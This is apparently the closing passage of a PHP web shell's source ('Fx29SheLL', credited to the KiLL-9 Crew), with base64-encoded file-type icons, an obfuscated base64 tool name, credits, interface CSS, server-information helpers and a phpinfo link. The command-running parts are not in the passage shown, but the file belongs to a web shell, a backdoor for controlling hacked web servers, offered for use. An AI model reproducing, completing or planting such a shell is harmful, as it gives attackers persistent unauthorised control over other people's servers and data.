  "WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".

  "AAA7",

  "ext_html"=>

'R0lGODlhEAAQALMOAIyt016Itv///2Gp4uXy/c3P/MXl/mtrnC6Z4mfd/Chgk7PO9lBVhnNzc///'.

'/wAAACH5BAHoAw4ALAAAAAAQABAAAASF0EkHqq1h6nuzloAgjkIwfJRIFJVxFMgHDGYQCMihe46d'.

'/IiBIEEQFA4SkwHBZAaKK2RPAFAACM0nwTUFMAeD5mFBWCCpTIV6rSCbKQkFQpEw2A1lw4LRa84X'.

'cn96fAg4gQgJAwwAensOAyFzCgyTAAsFgxKQAywVBZcGn3wTDKWlDaamEQA7',

  "ext_jpg"=>

'R0lGODlhDgAQALMMACYlIC6NFLOxKnqIcbPIikWoIkVFRWllROLZUmO8NqKmoBBxCAAAAAAAAAAA'.

'AAAAACH5BAHoAwwALAAAAAAOABAAAARbMKxJ6zw2iGQHFSACCpQ3CWJISmaBCsABcouJiECOIkVg'.

'7gadiBXoAXc9X/LGRBASvUEPmiA4qUXpFPpMZrHQojchJZjDVOpgoGib3+82W8Gu0+nrGD2Y4wcN'.

'EQA7',

  "ext_js"=>

'R0lGODlhDwAQAKIEAB4eHZ6eaOLih2BgWQAAAAAAAAAAAAAAACH5BAHoAwQALAAAAAAPABAAAANP'.

'SAoR8nAARcZ4rQkr68VCI1nTB4Vj0H1iALzwpIUY3FXOKb4UwYSqDODmY+ROREtmkEFNhqKRyfV7'.

'SFzHEQR62qSAnBxJoVSlxhRJLEZJAAA7',

  "ext_lnk"=>

'R0lGODlhEAAQAKIHAAAFACOPE2TNNj60IQRKAojuVgdlBAAAACH5BAHoAwcALAAAAAAQABAAAANO'.

'eGfcbkCpQOu4AkZlLM5AKHlCqW3TVw4hmqqlKB3UKhQF6AZ2ibM7Ew+Xk6UIoQAROAsgQ4RbIWBc'.

'tBbSq0RruD1dB1S3BZ5ZteYZ2ZwAADs=',

  "ext_log"=>

  "R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA".

  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN".

  "zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==",

  "ext_php"=>

'R0lGODlhEAAQAIABAP///////yH5BAHoAwEALAAAAAAQABAAAAIohI8Jwe0Po5wNsRWWxbl3blSe'.

'VmHmMWZouj2md7kxB8cfhec6pPRHAQA7',

  "ext_pl"=>

  "R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".

  "GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",

  "ext_swf"=>

  "R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".

  "nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".

  "ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".

  "GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".

  "NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",

  "ext_tar"=>

'R0lGODlhEAAQAKIFABokHymwoKiYkKIYbdzo4wAAAAAAAAAAACH5BAHoAwUALAAAAAAQABAAAAM4'.

'CLrcJVCMSesAJJOhY7waAUgWhWljo67rE7FMGGhzYNtnNt48HsJAlgsSzIlovYAxlfShBMVoIQEA'.

'Ow==',

  "ext_txt"=>

'R0lGODlhCwAQAKIFACoqKqCeoO/z83d2brO2vwAAAAAAAAAAACH5BAHoAwUALAAAAAALABAAAAM5'.

'CLM8MSBIJwNZJAhNRBdDR3xCCYqkGXppuZrwuVWj21mVJo+jZG812Cv288VWD+KQtQA4m4CCdJoA'.

'ADs=',

  "ext_wri"=>

  "R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".

  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".

  "a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",

  "ext_xml"=>

  "R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".

  "gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

  "AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".

  "OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".

  "IQA7"

  );

  return $images;

}

function sh_name() { return base64_decode("RmFUYUxpc1RpQ3pfRnggRngyOVNoZUxMIHY=").sh_ver; }

function fx29sh_tools() {

  echo "<div class=\"barheader\">.: TooLz :.</div>";

}

function fx29sh_about() {

  echo "<div class=\"barheader\">.: Credits :.</div>".

       "Idea, leader & coder: <b>tristram [CCTeaM]</b><br>".

       "Beta-tester & tips: <b>NukLeoN [AnTiSh@Re tEaM]</b><br>".

       "Re-coder, Designer, Windows Fix, PHP Mailer & PHP Filesystem: <b>kaMtiEz [KiLL-9 Crew]</b><br>".

       "<br>".

       "Please report bugs to <a href=\"mailto:rio_rizaldy@yahoo.com\">FaTaLisTiCz_Fx</a></b>\n";

}

function html_style() {

$style = '<html>

<head>

    <style>

        table {width: 100%;border-collapse: collapse;}

        #main, #maininfo {width: 900px;}

        body, table, input, select, option, .info

        {

            font: 8pt tahoma;

        }

        .footer {font: 7pt tahoma;}

        textarea, .code

        {

            font: 8pt Courier New;

            color: #dedbde;

            border: 1px solid #666666;

        }

        img {border: 0;}

        #maininfo img {width: 16;height: 16;}

        input, select, option {border: 1px solid #606060;}

        #maininfo, td, th {border: 1px solid #3F3F3F;}

        a {color: #5B5BFF;text-decoration: none;}

        #pagebar a, .barheader a {color: #00FF00;}

        a:hover, #pagebar a:hover {color: #3366FF;}

        .on {color: #00FF00;}

        .off, .errmsg {color: #FF0000;}

        body, table, input, select, option {color : #EEEEEE;}

        .info th {color: #969696;width: 13%;}

        .shell {font-size: 12;color: #C0C0C0;border: 0;}

        #pagebar a, .barheader, .errmsg, .on, .off

        {

            font-weight: bold;

        }

        p, form, .info, .info td, .info th, .explorer *

        {

            margin: 0;

        }

        input, #maininfo {margin: 3px;}

        #mainpanel input, #mainpanel select

        {

          margin: 0px 2px 0px 2px;

        }

        #maininfo table, select {margin: 2px 0px 2px 0px;}

        #pagebar, .bartitle, #mainpanel {background: #474747;}

        body, textarea, .shell, input, select, option

        {

            background: #000000;

        }

        .info, .info th, .info td, input[type="label"]

        {

            background: transparent;

            border: 0;

        }

        #pagebar td, #mainpanel td, #mainpanel th, .contents th, .explorer td

        {

            border-left: 0;

            border-right: 0;

        }

        .bartitle, .barheader, input[type="submit"], input[type="button"], input[type="reset"]

        {

            color: #D0D0D0;

            background: #3F3F3F;

            border: 1px solid #202020;

            border-top: 1px solid #505050;

            border-left: 1px solid #505050;

        }

        input[type="submit"]:hover, input[type="button"]:hover, input[type="reset"]:hover

        {

            color: #00FF00;

            background: #333333;

        }

        td, .info th {vertical-align: top;}

        .explorer td {vertical-align: middle;}

        .fleft {float: left;}

        .fright {float: right;}

        .code, .fleft, .info th {text-align: left;}

        .fright, input[type="label"], #mainpanel th, .contents th

        {

            text-align: right;

        }

        #maininfo, .bartitle, .quicklaunch, .quicklaunch a, .barheader, th

        {

            text-align: center;

        }

        td, textarea, input[type="text"], .bartitle, .barheader, .code, th

        {

            padding: 3px;

        }

        .info th, .info td {padding: 0px 2px 0px 2px;}

        .quicklaunch a {padding : 0px 5px 0px 5px;}

    </style>



    <title>'.getenv("HTTP_HOST").' - '.sh_name().'</title>



</head>



<body><center>



';

return $style;

};

function html_header() { return "<b>".sh_name()."</b><br>.: a little piece of heaven :."; }

function html_footer() { return "&copy; 2008 By kaMtiEz, KiLL-9 CreW. Generated: ".round(getmicrotime()-starttime,4)." seconds"; }

function disp_error($msg) { echo "<div class=errmsg>$msg</div>\n"; }

function srv_info($title,$contents) { echo "\t\t\t<tr><th>$title</th><td>:</td><td>$contents</td></tr>\n"; }

function srv_software($surl) {

  $srv_software = getenv("SERVER_SOFTWARE");

  if (!ereg("PHP/".phpversion(),$srv_software)) { $srv_software .= ". PHP/".phpversion(); }

  return str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\">PHP/".phpversion()."</a>",htmlspecialchars($srv_software));

}



########################

##[ END OF FUNCTIONS ]##

########################

chdir($lastdir); fx29shexit();

##########################

##[ FeeLCoMz Community ]##

##########################

?> 